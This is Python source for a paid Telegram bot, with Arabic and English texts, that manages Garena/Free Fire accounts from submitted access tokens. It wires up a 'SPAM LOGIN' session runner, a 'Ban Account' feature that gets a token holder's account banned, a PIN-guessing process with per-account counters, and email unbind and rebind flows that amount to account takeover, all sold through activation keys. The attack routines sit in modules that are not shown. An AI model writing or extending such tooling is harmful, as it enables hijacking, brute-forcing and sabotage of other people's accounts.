# bot.py
import re
import logging
import asyncio
import json
from datetime import datetime, timedelta
from io import BytesIO
import ssl
import base64
import time
import random
import sys
import os

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

from config import *
from database import DataManager, KeyManager, check_user_key, validate_key, PLATFORM_MAP, convert_seconds
import garena
import spam_manager
import ban_manager  # <-- إضافة استيراد ban_manager

logger = logging.getLogger(__name__)

# ============================================================
# LOCALIZATION (العربية والإنجليزية)
# ============================================================
LOCALIZED_TEXTS = {
    LANG_AR: {
        "welcome_unregistered": (
            "👑 <b>⚜️ ♛𝒀𝑨𝑺𝑰𝑵♛ 𝖡𝗈𝗍 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "⚠️ <b>هذا البوت مدفوع وغير مجاني!</b>\n\n"
            "يرجى التواصل مع المطور مباشرة للحصول على مفتاح تفعيل لتتمكن من استخدام ميزات البوت الذكية والمزينة لإدارة حساباتك:\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👨‍💻 المطور: <b>{DEV_NAME}</b>\n"
            f"📱 حساب تليجرام: @{DEV_USER}\n"
        ),
        "welcome_back": (
            "╭━━━━━━━━━━━━━━━━━━━━╮\n"
            "      ✦ <b>♛𝒀𝑨𝑺𝑰𝑵♛ 𝖢𝗈𝗇𝗍𝗋𝗈𝗅</b> ✦\n"
            "╰━━━━━━━━━━━━━━━━━━━━╯\n\n"
            "✨ <b>أهلاً بك من جديد</b>\n"
            "إدارة حساباتك أصبحت أبسط وأوضح من مكان واحد.\n\n"
            "👇 <b>اختر القسم الذي تريد الوصول إليه:</b>"
        ),
        "key_activated": "✅ <b>تم تفعيل المفتاح بنجاح!</b> استمتع بجميع الميزات والخصائص المزيّنة.",
        "invalid_key": "❌ <b>المفتاح غير صالح أو منتهي الصلاحية!</b> تواصل مع المطور شراء تفعيل.",
        "choose_lang": "🌍 <b>اختر اللغة المفضلة لديك / Choose Your Language:</b>",
        "lang_saved": "🌍 <b>تم حفظ وتأكيد تغيير لغة البوت إلى العربية بنجاح!</b>",
        "contact_us_text": (
            "📞 <b>تواصل معنا والدعم الفني:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👑 <b>المطور الرئيسي:</b> {DEV_NAME}\n"
            f"📱 <b>حساب الدعم والشراء المباشر:</b> @{DEV_USER}\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "راسلنا في أي وقت لتجديد تفعيلك أو طرح استفساراتك."
        ),
        "help_text": (
            "❓ <b>دليل الاستخدام السريع والمبسط:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "➕ <b>إضافة حساب:</b> لحفظ حساب جارينا جديد باستخدام كود/رابط الـ EAT.\n"
            "📂 <b>قائمة حساباتي:</b> تعرض حساباتك المضافة لتفقدها وفحص حالتها.\n"
            "⚙️ <b>التحكم في الحسابات:</b> لاختيار حساب محفوظ وإجراء عمليات الربط والفك وتأمين الحسابات بالكامل.\n"
            "🔑 <b>تشغيل Login:</b> لتشغيل جلسات تسجيل الدخول (SPAM LOGIN).\n"
            "⏹️ <b>إيقاف Login:</b> لإيقاف جميع جلسات تسجيل الدخول.\n"
            "🚫 <b>حظر الحساب:</b> لحظر حساب Free Fire باستخدام التوكن."
        ),
        "admin_welcome": (
            "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "      👑 <b>♛𝒀𝑨𝑺𝑰𝑵♛ • ADMIN</b>\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            "🎛️ <b>لوحة الإدارة الرئيسية</b>\n"
            "كل أدوات الإدارة مرتبة في أقسام مختصرة وسهلة.\n\n"
            "👇 اختر الأداة المطلوبة للمتابعة."
        ),
        "loading_verification": "⏳ <b>جاري التحقق من التوكن واستخراج معلومات الحساب...</b>",
        "enter_eat": "➕ <b>إضافة حساب Garena جديد لقائمتك</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nيرجى إرسال رابط تسجيل الدخول EAT الكامل أو التوكن المباشر الخاص بالحساب ليتم معالجته:\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "acc_added": "✅ <b>تم إضافة وحفظ الحساب بنجاح!</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n👤 اسم الحساب: <b>{name}</b>\n🆔 معرف الحساب: <code>{aid}</code>\n🌍 المنطقة: <b>{region}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nيمكنك الآن التحكم به بالكامل من قائمة التحكم.",
        "acc_not_found": "❌ لم يتم العثور على بيانات هذا الحساب.",
        "no_accs_ctrl": "📭 لا توجد حسابات للتحكم بها. أضف حساباً أولاً.",
        "choose_ctrl_acc": "╭─ ⚙️ <b>مركز إدارة الحسابات</b>\n╰─ اختر الحساب الذي تريد فتحه:",
        "enter_new_email": "🟢 <b>أدخل عنوان البريد الإلكتروني الجديد الذي تريد ربطه بالحساب:</b>",
        "cancel_success": "🗑️ <b>تم إلغاء طلب ربط البريد المعلق بنجاح.</b>",
        "deleted_success": "🗑️ <b>تم حذف وإزالة الحساب من قائمتك بالبوت تماماً بنجاح.</b>",
        "kick_success": "✅ تم طرد العضو صاحب الآيدي <code>{target_id}</code> بالكامل بنجاح.",
        "admin_added_success": "👑 تم ترقية العضو <code>{target_id}</code> إلى رتبة مسؤول بنجاح.",
        "broadcast_success": "✅ تم تسليم البث لـ <b>{sent}</b> عضو بنجاح.",
        "stats_title": "╔══════════════════════╗\n   📊 <b>إحصائيات النظام</b>\n╚══════════════════════╝\n\n🔑 المفاتيح المولدة: <b>{keys_total}</b>\n🟢 المفاتيح النشطة: <b>{keys_active}</b>\n👥 الأعضاء: <b>{users_total}</b>\n📂 الحسابات المحفوظة: <b>{accounts_total}</b>\n\n✨ النظام يعمل من لوحة واحدة.",
        "long_bio_success": "✍️ <b>تم تعيين البايو الطويل بنجاح!</b>\n\n💬 النص الحالي:\n<code>{text}</code>",
        "enter_long_bio": "✍️ <b>أرسل الآن البايو (التوقيع) الطويل والملون الذي تريد تعيينه على حسابك فري فاير:</b>",
        "current_email": "📧 الإيميل المربوط:",
        "pending_email": "⏳ طلب ربط معلق:",
        "remaining_time": "⏱️ العداد المتبقي:",
        "no_saved_accs": "📭 ليس لديك حسابات محفوظة حالياً بالبوت.",
        "my_saved_accs_title": "╭─ 📂 <b>حساباتك المحفوظة</b>\n╰─ الحالة الحالية لكل حساب:",
        "login_prompt": "🔑 **أرسل توكن الوصول (Access Token) لتشغيل جلسات تسجيل الدخول:**",
        "login_status_text": "📊 **حالة جلسات تسجيل الدخول:**\n\n{status}",
        "login_started": "✅ **تم تشغيل جلسات تسجيل الدخول بنجاح!**\n\n👤 **اسم الحساب:** {name}\n🆔 **UID:** {uid}\n🌍 **المنطقة:** {region}\n📱 **المنصة:** {platform}\n🔢 **عدد الجلسات:** {sessions}\n⏱️ **معدل البينق:** {ping} ثانية",
        "login_stopped": "✅ **تم إيقاف جميع جلسات تسجيل الدخول بنجاح!**",
        "login_already_active": "⚠️ جلسة تسجيل دخول نشطة بالفعل!",
        "login_not_active": "⚠️ لا توجد جلسات نشطة لإيقافها!",
        "login_failed": "❌ فشل تسجيل الدخول على جميع المنصات!",
        "ban_prompt": "🔑 **أرسل التوكن (Access Token) لنكح الحساب:**\n\nيمكنك إرسال التوكن العادي أو JWT.",
        "ban_success": "✅ **تم حظر الحساب بنجاح!**\n\n👤 **الاسم:** {nickname}\n🆔 **المعرف:** {account_id}\n🌍 **المنطقة:** {region}\n📦 **نوع الحظر:** {ban_type} ({ban_duration})\n📁 **حفظ في:** {saved_file}",
        "ban_failed": "❌ **فشل الحظر:**\n{error}",
        "ban_loading": "⏳ جاري تنفيذ عملية الحظر... قد تستغرق بضع ثوان."
    },
    LANG_EN: {
        "welcome_unregistered": (
            "👑 <b>⚜️ ♛𝒀𝑨𝑺𝑰𝑵♛ 𝖡𝗈𝗍 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "⚠️ <b>This is a premium and paid bot!</b>\n\n"
            "Please contact the developer directly to purchase an activation key and unlock all smart account management utilities:\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👨‍💻 Developer: <b>{DEV_NAME}</b>\n"
            f"📱 Telegram: @{DEV_USER}\n"
        ),
        "welcome_back": (
            "👑 <b>⚜️ ♛𝒀𝑨𝑺𝑰𝑵♛ 𝖡𝗈𝗍 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "✨ <b>Welcome back to your smart Garena Control Center!</b> ✨\n\n"
            "Now you can manage, bind, unbind, and inspect all Garena accounts cleanly with interactive inline menus."
        ),
        "key_activated": "✅ <b>Key Activated Successfully!</b> Enjoy our premium decorated tools.",
        "invalid_key": "❌ <b>The key you entered is invalid or expired!</b> Contact dev to buy a key.",
        "choose_lang": "🌍 <b>Choose Your Language / اختر اللغة المفضلة لديك:</b>",
        "lang_saved": "🌍 <b>Language successfully updated to English!</b>",
        "contact_us_text": (
            "📞 <b>Contact Us & Customer Support:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👑 <b>Lead Developer:</b> {DEV_NAME}\n"
            f"📱 <b>Support & Purchase Account:</b> @{DEV_USER}\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "Feel free to message us anytime for key renewals or assistance."
        ),
        "help_text": (
            "❓ <b>Quick User Manual:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "➕ <b>Add Account:</b> Save a Garena session using EAT link/token.\n"
            "📂 <b>My Accounts:</b> View saved account list and verify token status.\n"
            "⚙️ <b>Control Accounts:</b> Select an account to manage, bind email, unbind, and revoke tokens.\n"
            "🔑 <b>Start Login:</b> Start login sessions (SPAM LOGIN).\n"
            "⏹️ <b>Stop Login:</b> Stop all login sessions.\n"
            "🚫 <b>Ban Account:</b> Ban a Free Fire account using token."
        ),
        "admin_welcome": (
            "👑 <b>Admin & Developer Dashboard</b> 👑\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "Welcome, Admin! Here you can safely generate keys, manage members, configure system-wide parameters, and fetch logs."
        ),
        "loading_verification": "⏳ <b>Verifying Garena session and extracting profile...</b>",
        "enter_eat": "➕ <b>Add Garena Account</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nPlease send the full EAT login URL or raw access token:\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "acc_added": "✅ <b>Account Added Successfully!</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n👤 Nickname: <b>{name}</b>\n🆔 Account ID: <code>{aid}</code>\n🌍 Region: <b>{region}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nYou can now fully manage it from the Control Panel.",
        "acc_not_found": "❌ Account data not found.",
        "no_accs_ctrl": "📭 You don't have any saved accounts yet. Add one first.",
        "choose_ctrl_acc": "⚙️ <b>Select the account you want to open and manage:</b>",
        "enter_new_email": "🟢 <b>Enter the new email address you want to bind to this account:</b>",
        "cancel_success": "🗑️ <b>Pending bind request cancelled successfully.</b>",
        "deleted_success": "🗑️ <b>Account deleted from bot registry successfully.</b>",
        "kick_success": "✅ User <code>{target_id}</code> kicked out and all keys detached.",
        "admin_added_success": "👑 User <code>{target_id}</code> promoted to admin successfully.",
        "broadcast_success": "✅ Broadcast delivered to <b>{sent}</b> users.",
        "stats_title": "📊 <b>System Statistics Data:</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n🔑 Generated Keys: <b>{keys_total}</b>\n🟢 Active Keys: <b>{keys_active}</b>\n👥 Registered Users: <b>{users_total}</b>\n📂 Saved Accounts: <b>{accounts_total}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "long_bio_success": "✍️ <b>Long Bio set successfully!</b>\n\n💬 Current Bio:\n<code>{text}</code>",
        "enter_long_bio": "✍️ <b>Send the long, customized bio text you want to set on Garena profile:</b>",
        "current_email": "📧 Current Bound Email:",
        "pending_email": "⏳ Pending Bind Request:",
        "remaining_time": "⏱️ Remaining Time:",
        "no_saved_accs": "📭 You do not have any saved accounts in this bot currently.",
        "my_saved_accs_title": "📂 <b>Your saved accounts list and current active states:</b>",
        "login_prompt": "🔑 **Send Access Token to start login sessions:**",
        "login_status_text": "📊 **Login Sessions Status:**\n\n{status}",
        "login_started": "✅ **Login sessions started successfully!**\n\n👤 **Name:** {name}\n🆔 **UID:** {uid}\n🌍 **Region:** {region}\n📱 **Platform:** {platform}\n🔢 **Sessions:** {sessions}\n⏱️ **Ping:** {ping}s",
        "login_stopped": "✅ **All login sessions stopped successfully!**",
        "login_already_active": "⚠️ Login session already active!",
        "login_not_active": "⚠️ No active sessions to stop!",
        "login_failed": "❌ Login failed on all platforms!",
        "ban_prompt": "🔑 **Send Access Token to ban the account:**\n\nYou can send raw token or JWT.",
        "ban_success": "✅ **Account banned successfully!**\n\n👤 **Name:** {nickname}\n🆔 **ID:** {account_id}\n🌍 **Region:** {region}\n📦 **Ban Type:** {ban_type} ({ban_duration})\n📁 **Saved in:** {saved_file}",
        "ban_failed": "❌ **Ban failed:**\n{error}",
        "ban_loading": "⏳ Executing ban operation... This may take a few seconds."
    }
}

def get_txt(key: str, lang: str = LANG_AR) -> str:
    return LOCALIZED_TEXTS.get(lang, LOCALIZED_TEXTS[LANG_AR]).get(key, f"Missing [{key}]")

# ============================================================
# SMART DYNAMIC EDIT HELPER
# ============================================================
async def smart_edit(query, text: str, reply_markup: InlineKeyboardMarkup) -> None:
    try:
        if query.message.photo or query.message.caption is not None:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
        else:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="HTML")
    except Exception:
        try:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="HTML")
        except:
            pass

# ============================================================
# INTERACTIVE KEYBOARD MARKUPS - ألوان منظمة ومتناسقة
# ============================================================
def make_user_menu(lang: str = LANG_AR, is_admin: bool = False) -> InlineKeyboardMarkup:
    """واجهة رئيسية محسّنة بصرياً؛ لا تغيّر أي callback أو وظيفة."""
    if lang == LANG_AR:
        buttons = [
            [InlineKeyboardButton("➕ إضافة حساب", callback_data="btn_add_acc", style="success"),
             InlineKeyboardButton("📂 حساباتي", callback_data="btn_my_accs", style="primary")],
            [InlineKeyboardButton("⚙️ مركز التحكم", callback_data="btn_ctrl_accs", style="primary"),
             InlineKeyboardButton("🌍 اللغة", callback_data="btn_change_lang", style="primary")],
            [InlineKeyboardButton("📞 الدعم", callback_data="btn_contact", style="primary"),
             InlineKeyboardButton("❔ دليل الاستخدام", callback_data="btn_help", style="primary")],
            [InlineKeyboardButton("🚫 حظر الحساب", callback_data="btn_ban_acc", style="danger")],
        ]
        if is_admin:
            buttons.append([InlineKeyboardButton("👑 لوحة الإدارة", callback_data="btn_admin_panel", style="success")])
        buttons.append([InlineKeyboardButton("✨ 𝖱𝖠𝗊𝖨𝖬 • الرئيسية", callback_data="btn_goto_home", style="primary")])
    else:
        buttons = [
            [InlineKeyboardButton("➕ Add Account", callback_data="btn_add_acc", style="success"),
             InlineKeyboardButton("📂 My Accounts", callback_data="btn_my_accs", style="primary")],
            [InlineKeyboardButton("⚙️ Control Center", callback_data="btn_ctrl_accs", style="primary"),
             InlineKeyboardButton("🌍 Language", callback_data="btn_change_lang", style="primary")],
            [InlineKeyboardButton("📞 Support", callback_data="btn_contact", style="primary"),
             InlineKeyboardButton("❔ User Guide", callback_data="btn_help", style="primary")],
            [InlineKeyboardButton("🚫 Ban Account", callback_data="btn_ban_acc", style="danger")],
        ]
        if is_admin:
            buttons.append([InlineKeyboardButton("👑 Admin Dashboard", callback_data="btn_admin_panel", style="success")])
        buttons.append([InlineKeyboardButton("✨ 𝖱𝖠𝗊𝖨𝖬 • Home", callback_data="btn_goto_home", style="primary")])
    return InlineKeyboardMarkup(buttons)


def make_admin_menu(lang: str = LANG_AR, is_owner: bool = False) -> InlineKeyboardMarkup:
    """لوحة إدارة أكثر وضوحاً مع الحفاظ الكامل على callback_data والصلاحيات."""
    if lang == LANG_AR:
        buttons = [
            [InlineKeyboardButton("🔑 مفتاح جديد", callback_data="adm_gen_key", style="success"),
             InlineKeyboardButton("📦 دفعة مفاتيح", callback_data="adm_gen_batch", style="success")],
            [InlineKeyboardButton("📋 المفاتيح", callback_data="adm_list_keys", style="primary"),
             InlineKeyboardButton("⛔ تعطيل مفتاح", callback_data="adm_disable_key", style="danger")],
            [InlineKeyboardButton("📊 الإحصائيات", callback_data="adm_stats", style="primary"),
             InlineKeyboardButton("📢 البث", callback_data="adm_broadcast", style="primary")],
            [InlineKeyboardButton("👤 إدارة عضو", callback_data="adm_kick_user", style="danger")],
        ]
        if is_owner:
            buttons.append([InlineKeyboardButton("➕ إضافة أدمن", callback_data="adm_add_admin", style="success"),
                            InlineKeyboardButton("📜 سجل النظام", callback_data="adm_json_log", style="primary")])
        buttons.append([InlineKeyboardButton("↩️ لوحة المستخدم", callback_data="adm_goto_user", style="primary")])
    else:
        buttons = [
            [InlineKeyboardButton("🔑 New Key", callback_data="adm_gen_key", style="success"),
             InlineKeyboardButton("📦 Batch Keys", callback_data="adm_gen_batch", style="success")],
            [InlineKeyboardButton("📋 Key List", callback_data="adm_list_keys", style="primary"),
             InlineKeyboardButton("⛔ Disable Key", callback_data="adm_disable_key", style="danger")],
            [InlineKeyboardButton("📊 Statistics", callback_data="adm_stats", style="primary"),
             InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast", style="primary")],
            [InlineKeyboardButton("👤 Member Control", callback_data="adm_kick_user", style="danger")],
        ]
        if is_owner:
            buttons.append([InlineKeyboardButton("➕ Add Admin", callback_data="adm_add_admin", style="success"),
                            InlineKeyboardButton("📜 System Log", callback_data="adm_json_log", style="primary")])
        buttons.append([InlineKeyboardButton("↩️ User Dashboard", callback_data="adm_goto_user", style="primary")])
    return InlineKeyboardMarkup(buttons)


def make_acc_control_keyboard(lang: str, aid: str, is_active: bool = False,
                              is_guessing: bool = False, is_daily_limit: bool = False) -> InlineKeyboardMarkup:
    """لوحة حساب مرتبة على شكل أقسام؛ callback_data كما هي بدون تغيير."""
    if is_active:
        login_btn = InlineKeyboardButton(
            "⏹️ إيقاف الجلسة" if lang == LANG_AR else "⏹️ Stop Session",
            callback_data=f"op_stop_login_{aid}", style="danger")
    else:
        login_btn = InlineKeyboardButton(
            "▶️ تشغيل الجلسة" if lang == LANG_AR else "▶️ Start Session",
            callback_data=f"op_start_login_{aid}", style="success")

    if is_daily_limit:
        action_btn = InlineKeyboardButton(
            "⏳ الحد اليومي مكتمل" if lang == LANG_AR else "⏳ Daily Limit Reached",
            callback_data="op_daily_limit_alert", style="primary")
    elif is_guessing:
        action_btn = InlineKeyboardButton(
            "⏹️ إيقاف العملية" if lang == LANG_AR else "⏹️ Stop Process",
            callback_data=f"op_stop_guess_{aid}", style="danger")
    else:
        action_btn = InlineKeyboardButton(
            "▶️ تشغيل العملية" if lang == LANG_AR else "▶️ Start Process",
            callback_data=f"op_start_guess_{aid}", style="success")

    if lang == LANG_AR:
        rows = [
            [InlineKeyboardButton("📧 البريد", callback_data="op_check_email", style="primary"),
             InlineKeyboardButton("➕ ربط بريد", callback_data="op_add_email", style="success")],
            [InlineKeyboardButton("🌐 المنصات", callback_data="op_check_platforms", style="primary"),
             InlineKeyboardButton("🔄 تغيير البريد", callback_data="op_change_email", style="primary")],
            [InlineKeyboardButton("🗑️ إلغاء المعلّق", callback_data="op_cancel_pending", style="primary"),
             InlineKeyboardButton("🔓 فك الربط", callback_data="op_unbind_email", style="danger")],
            [InlineKeyboardButton("✍️ تعديل الملف", callback_data="op_set_bio", style="primary"),
             InlineKeyboardButton("🔐 إنهاء الجلسة", callback_data="op_revoke_token", style="danger")],
            [action_btn],
            [login_btn],
            [InlineKeyboardButton("🗑️ إزالة الحساب", callback_data=f"op_delete_acc_{aid}", style="danger")],
            [InlineKeyboardButton("↩️ الحسابات", callback_data="btn_ctrl_accs", style="primary")],
        ]
    else:
        rows = [
            [InlineKeyboardButton("📧 Email", callback_data="op_check_email", style="primary"),
             InlineKeyboardButton("➕ Bind Email", callback_data="op_add_email", style="success")],
            [InlineKeyboardButton("🌐 Platforms", callback_data="op_check_platforms", style="primary"),
             InlineKeyboardButton("🔄 Change Email", callback_data="op_change_email", style="primary")],
            [InlineKeyboardButton("🗑️ Cancel Pending", callback_data="op_cancel_pending", style="primary"),
             InlineKeyboardButton("🔓 Unbind Email", callback_data="op_unbind_email", style="danger")],
            [InlineKeyboardButton("✍️ Edit Profile", callback_data="op_set_bio", style="primary"),
             InlineKeyboardButton("🔐 Revoke Session", callback_data="op_revoke_token", style="danger")],
            [action_btn],
            [login_btn],
            [InlineKeyboardButton("🗑️ Remove Account", callback_data=f"op_delete_acc_{aid}", style="danger")],
            [InlineKeyboardButton("↩️ Accounts", callback_data="btn_ctrl_accs", style="primary")],
        ]
    return InlineKeyboardMarkup(rows)

# ============================================================
# BOT COMMANDS & STATUS COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id
    DataManager.ensure_user(user_id, user.username or "", user.first_name or "")
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    
    if not check_user_key(user_id):
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📞 شراء تفعيل / Buy Key", url=f"https://t.me/{DEV_USER}", style="primary")]])
        msg = get_txt("welcome_unregistered", lang)
        context.user_data["state"] = "awaiting_activation_key"
        await update.message.reply_html(msg, reply_markup=keyboard)
        return
    
    await update.message.reply_html(
        get_txt("welcome_back", lang),
        reply_markup=make_user_menu(lang, is_admin)
    )

async def cmd_login_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    lang = DataManager.get_user_lang(user_id)
    
    if not check_user_key(user_id):
        await update.message.reply_html(get_txt("invalid_key", lang))
        return
    
    status = spam_manager.get_login_status()
    await update.message.reply_html(get_txt("login_status_text", lang).format(status=status))

# ============================================================
# DYNAMIC VIEW HELPER
# ============================================================
async def show_account_control_view(query, user_id: int, aid: str, context: ContextTypes.DEFAULT_TYPE) -> None:
    lang = DataManager.get_user_lang(user_id)
    u_info = DataManager.get_users().get(str(user_id), {})
    acc_data = u_info.get("accounts", {}).get(aid)
    if not acc_data:
        await smart_edit(query, get_txt("acc_not_found", lang), InlineKeyboardMarkup([]))
        return
        
    email, pending, countdown, _ = await garena.get_bind_info(acc_data["ACCESS_TOKEN"])
    
    lbl_current = get_txt("current_email", lang)
    lbl_pending = get_txt("pending_email", lang)
    lbl_remaining = get_txt("remaining_time", lang)
    opt_lbl = "اختر أي عملية تفاعلية لتنفيذها على الحساب:" if lang == LANG_AR else "Select any interactive operation to perform on Garena account:"
    
    banner_url = f"https://nirob-free-fire-baner.vercel.app/profile?uid={acc_data['ID']}"
    invisible_preview_link = f'<a href="{banner_url}">&#8205;</a>'
    
    is_active_for_this = spam_manager.is_session_active(aid)
    is_guessing_for_this = acc_data.get("guessing_active", False)
    
    today_str = datetime.now().strftime("%Y-%m-%d")
    is_daily_limit = (acc_data.get("last_guess_date", "") == today_str) and (acc_data.get("guesses_today_count", 0) >= 10)
    
    if lang == LANG_AR:
        spam_status = "🟢 نشط ومستمر" if is_active_for_this else "🔴 متوقف حالياً"
        if is_daily_limit:
            guess_status = "⏳ حد يومي (10/10)"
        elif is_guessing_for_this:
            guess_status = f"🟢 نشط (تم فحص {acc_data.get('pin_index', 0)} رمز)"
        else:
            guess_status = "🔴 متوقف"
    else:
        spam_status = "🟢 Active & Running" if is_active_for_this else "🔴 Currently Inactive"
        if is_daily_limit:
            guess_status = "⏳ Daily Limit (10/10)"
        elif is_guessing_for_this:
            guess_status = f"🟢 Active ({acc_data.get('pin_index', 0)} tried)"
        else:
            guess_status = "🔴 Inactive"
        
    msg = (
        f"{invisible_preview_link}╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"        👤 <b>{acc_data['NAME']}</b>\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"🆔 معرف الحساب: <code>{acc_data['ID']}</code>\n"
        f"🌍 المنطقة: <b>{acc_data['region']}</b>\n"
        f"⚡ حالة سبام الدخول: <b>{spam_status}</b>\n"
        f"🧠 حالة التخمين الذكي: <b>{guess_status}</b>\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"{lbl_current} <code>{email or 'None'}</code>\n"
        f"{lbl_pending} <code>{pending or 'None'}</code>\n"
        f"{lbl_remaining} <b>{convert_seconds(countdown, lang) if pending else 'None'}</b>\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"✨ {opt_lbl}"
    )
    
    await smart_edit(query, msg, make_acc_control_keyboard(lang, aid, is_active_for_this, is_guessing_for_this, is_daily_limit))

# ============================================================
# TEXT INPUT STATE MACHINE
# ============================================================
async def handle_text_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    state = context.user_data.get("state")
    text = update.message.text.strip()
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)

    if state == "awaiting_activation_key":
        success, msg_info = validate_key(text, user_id)
        if success:
            context.user_data["state"] = None
            await update.message.reply_html(
                get_txt("key_activated", lang),
                reply_markup=make_user_menu(lang, is_admin)
            )
        else:
            await update.message.reply_html(get_txt("invalid_key", lang))
        return

    if state == "awaiting_eat_input":
        context.user_data["state"] = None
        loading_msg = await update.message.reply_html(get_txt("loading_verification", lang))
        error, data = await garena.eat_to_token(text)
        if error:
            err_lbl = "فشل إضافة الحساب:" if lang == LANG_AR else "Failed to add account:"
            await loading_msg.edit_text(f"❌ <b>{err_lbl}</b>\n{error}", parse_mode="HTML")
            return
        
        DataManager.save_garena_account(
            user_id=user_id,
            account_id=data["account_id"],
            nickname=data["nickname"],
            region=data["region"],
            access_token=data["access_token"],
            eat_token=text
        )
        
        success_msg = get_txt("acc_added", lang).format(
            name=data['nickname'],
            aid=data['account_id'],
            region=data['region']
        )
        await loading_msg.edit_text(success_msg, parse_mode="HTML", reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_unbind_sec_code":
        context.user_data["state"] = None
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        if not acc_data:
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
            
        email, _, _, _ = await garena.get_bind_info(acc_data["ACCESS_TOKEN"])
        success, msg, identity_token = await garena.verify_identity_sec(email, acc_data["ACCESS_TOKEN"], text)
        
        if not success or not identity_token:
            msg_resp = garena.format_api_text(msg, "التحقق من الهوية بكود الحماية", "Verify Identity with Sec Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        ok, resp_msg = await garena.create_unbind_request(acc_data["ACCESS_TOKEN"], identity_token)
        msg_resp = garena.format_api_text(resp_msg, "طلب فك ربط الإيميل", "Create Unbind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_rebind_sec_code":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        if not acc_data:
            context.user_data["state"] = None
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
            
        email, _, _, _ = await garena.get_bind_info(acc_data["ACCESS_TOKEN"])
        success, msg, identity_token = await garena.verify_identity_sec(email, acc_data["ACCESS_TOKEN"], text)
        
        if not success or not identity_token:
            context.user_data["state"] = None
            msg_resp = garena.format_api_text(msg, "التحقق من الهوية بكود الحماية", "Verify Identity with Sec Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        context.user_data["rebind_identity_token"] = identity_token
        context.user_data["state"] = "awaiting_rebind_new_email"
        await update.message.reply_html("🟢 <b>تم التحقق من الهوية بنجاح!</b>\n\nيرجى إرسال <b>البريد الإلكتروني الجديد</b> الذي ترغب في ربطه بهذا الحساب:")
        return

    if state == "awaiting_rebind_new_email":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        new_email = text
        if "@" not in new_email:
            await update.message.reply_html("❌ صيغة بريد إلكتروني غير صحيحة! يرجى الإرسال بشكل صحيح:")
            return
            
        context.user_data["rebind_new_email"] = new_email
        context.user_data["state"] = "awaiting_rebind_otp"
        
        success, msg = await garena.send_otp(new_email, acc_data["ACCESS_TOKEN"])
        msg_resp = garena.format_api_text(msg, "إرسال كود الـ OTP للبريد الجديد", "Sending OTP to new email", lang)
        await update.message.reply_html(f"📥 <b>{msg_resp}</b>\n\nيرجى كتابة رمز التحقق (OTP) المرسل للبريد الإلكتروني الجديد الآن لتأكيد عملية التغيير:")
